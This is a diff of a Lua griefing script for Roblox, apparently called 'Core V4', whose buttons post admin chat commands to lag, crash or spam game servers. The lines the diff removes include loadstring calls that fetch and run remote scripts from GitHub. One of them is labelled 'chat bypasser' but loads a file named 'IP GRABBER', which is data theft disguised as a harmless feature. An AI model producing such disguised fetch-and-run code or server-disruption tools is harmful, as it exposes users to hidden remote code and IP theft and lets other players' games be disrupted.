@@ -70,7 +70,7 @@ local Button = Tab:CreateButton({
 local Button = Tab:CreateButton({
    Name = "gui loaded/credit",
    Callback = function()
-      game.Players:Chat ("h \n \n \n  Core V4: CoreV4 got executed made by inyuhbhutt \n \n \n")
+      game.Players:Chat ("h \n\n\n\n\n\n got excuted made by inyuhbhutt")
 
    end,
 })
@@ -78,7 +78,7 @@ local Button = Tab:CreateButton({
 local Button = Tab:CreateButton({
    Name = "anti-logs",
    Callback = function()
-   game.Players:Chat ("h /n /n /n  Core V4: no logs for you /n /n /n ")
+   game.Players:Chat ("h \n\n\n\n\n\n no logs for you")
    end,
 })
 
@@ -102,21 +102,6 @@ local Button = Tab:CreateButton({
    end,
 })
 
-local Button = Tab:CreateButton({
-   Name = "Core v4 joined",
-   Callback = function()
-   game.Players:Chat(" h /n /n /n Core V4: owner joined (inyuhbhutt) /n /n /n")
-   end,
-   })
-
-
-local Button = Tab:CreateButton({
-   Name = "owner left",
-   Callback = function()
-   game.Players:Chat(" h /n /n /n Core V4: owner has left (inyuhbhutt)/n /n /n /n ")
-   end,
-})
-
 
 local Tab = Window:CreateTab("owner stuff", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("owner stuff")
@@ -124,28 +109,28 @@ local Section = Tab:CreateSection("owner stuff")
 local Button = Tab:CreateButton({
    Name = "owner joined",
    Callback = function()
-   game.Players:Chat("h Core V4 owner joined inyuhbhutt")
+   game.Players:Chat("h Core V4 owner joined")
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "owner went AFK",
    Callback = function()
-   game.Players:Chat("h  Core V4 owner went AFK inyuhbhutt")
+   game.Players:Chat("h \n \n \n  Core V4: Core V4 owner went AFK (inyuhbhutt) \n \n \n")
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "owner left",
    Callback = function()
-   game.Players:Chat("h  owner has left inyuhbhutt")
+   game.Players:Chat("h \n \n \n  Core V4: Core V4 owner has left the game (inyuhbhutt) \n \n \n")
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "owner friend joined",
    Callback = function()
-   game.Players:Chat("h owner friend joined totallynotshrek")
+   game.Players:Chat("h \n \n \n  Core V4: owner friend joined (agoodusernameo) \n \n \n")
    end,
 })
 
@@ -169,7 +154,7 @@ game.Players:Chat("h outcrashing rookies")
 local Button = Tab:CreateButton({
    Name = "owner tabbed out",
    Callback = function()
-   game.Player:Chat("h owner tabbed out loading another script")
+      game.Players:Chat("h \n \n \n  Core V4: Core V4 owner tabbed out (loading another script) \n \n \n")
    end,
 })
 
@@ -183,60 +168,13 @@ local Button = Tab:CreateButton({
 local Button = Tab:CreateButton({
    Name = "lagger",
    Callback = function()
-   game.Player:Chat("explode others")
+   game.Players:Chat("explode others")
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "warning",
    Callback = function()
-   game.Player:Chat("h the owner of Core v4 is about to crash ")
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "server lock",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/jjjiiw/rrr/main/core%20v5"))();
-
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "findregen",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/jjjiiw/Core-V4-creator-join/main/Core%20V4%20creator%20join"))();
-   end,
-})
-
-local Tab = Window:CreateTab("good scripts", 4483362458) -- Title, Image
-local Section = Tab:CreateSection("good scripts")
-
-local Button = Tab:CreateButton({
-   Name = "chat bypasser",
-   Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/jjjiiw/ip-grabber/main/IP%20GRABBER"))();
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "unpunish me",
-   Callback = function()
-   game.Players:Chat("refresh me,me,me,me,me,me")
-wait (0.1)
-game.Players:Chat(":refresh me,me,me,me,me,me")
-wait (0.1)
-game.Players:Chat(":refresh me,me,me,me,me,me")
-wait (0.1)
-game.Players:Chat(":refresh me,me,me,me,me,me")
-   end,
-})
-
-local Button = Tab:CreateButton({
-   Name = "tp to pad in anyway",
-   Callback = function()
-   part = Script.Parent
-
-part.Position(-24.9244595, 8.6299963, 94.7119522, 0.996790409, -2.7101656e-08, -0.0800554454, 2.95785796e-08, 1, 2.97542435e-08, 0.0800554454, -3.20266693e-08, 0.996790409)
+   game.Players:Chat("h \n \n \n  Core V4: core V4 owner is about to crash \n \n \n")
    end,
 })
